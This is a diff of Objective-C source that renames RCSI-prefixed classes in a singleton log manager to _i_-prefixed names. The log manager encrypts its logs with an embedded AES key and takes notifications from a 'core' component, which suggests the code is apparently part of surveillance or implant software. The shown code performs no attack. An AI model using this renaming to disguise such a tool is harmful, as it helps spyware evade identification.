@@ -22,7 +22,7 @@
 
 //#define DEBUG_
 
-static RCSILogManager *sharedLogManager = nil;
+static _i_LogManager *sharedInstance = nil;
 
 #pragma mark -
 #pragma mark Log File Header Struct Definition
@@ -44,7 +44,7 @@ typedef struct _log {
   u_int additionalDataLength; // Size of additional data if present
 } logStruct;
 
-@implementation RCSILogManager
+@implementation _i_LogManager
 
 @synthesize notificationPort;
 
@@ -52,11 +52,11 @@ typedef struct _log {
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSILogManager *)sharedInstance
++ (_i_LogManager *)sharedInstance
 {
   @synchronized(self)
   {
-    if (sharedLogManager == nil)
+    if (sharedInstance == nil)
       {
         //
         // Assignment is not done here
@@ -65,21 +65,21 @@ typedef struct _log {
       }
   }
   
-  return sharedLogManager;
+  return sharedInstance;
 }
 
 + (id)allocWithZone: (NSZone *)aZone
 {
   @synchronized(self)
   {
-    if (sharedLogManager == nil)
+    if (sharedInstance == nil)
       {
-        sharedLogManager = [super allocWithZone: aZone];
+        sharedInstance = [super allocWithZone: aZone];
         
         //
         // Assignment and return on first allocation
         //
-        return sharedLogManager;
+        return sharedInstance;
       }
   }
   
@@ -98,7 +98,7 @@ typedef struct _log {
   
   @synchronized(myClass)
     {
-      if (sharedLogManager != nil)
+      if (sharedInstance != nil)
         {
           self = [super init];
           
@@ -118,15 +118,15 @@ typedef struct _log {
               NSData *temp = [NSData dataWithBytes: gLogAesKey
                                             length: CC_MD5_DIGEST_LENGTH];
 #endif
-              mEncryption = [[RCSIEncryption alloc] initWithKey: temp];
+              mEncryption = [[_i_Encryption alloc] initWithKey: temp];
               mLogMessageQueue = [[NSMutableArray alloc] initWithCapacity:0];
             }
           
-          sharedLogManager = self;
+          sharedInstance = self;
         }
     }
   
-  return sharedLogManager;
+  return sharedInstance;
 }
 
 - (id)retain
@@ -830,7 +830,7 @@ NSString *kRunLoopLogManagerMode = @"kRunLoopLogManagerMode";
   [logManagerRunLoop addPort: notificationPort 
                      forMode: kRunLoopLogManagerMode];
   
-  // run the log loop: RCSICore send notification to this
+  // run the log loop: _i_Core send notification to this
   // this thread won't be never stopped...
   while (TRUE)
   {
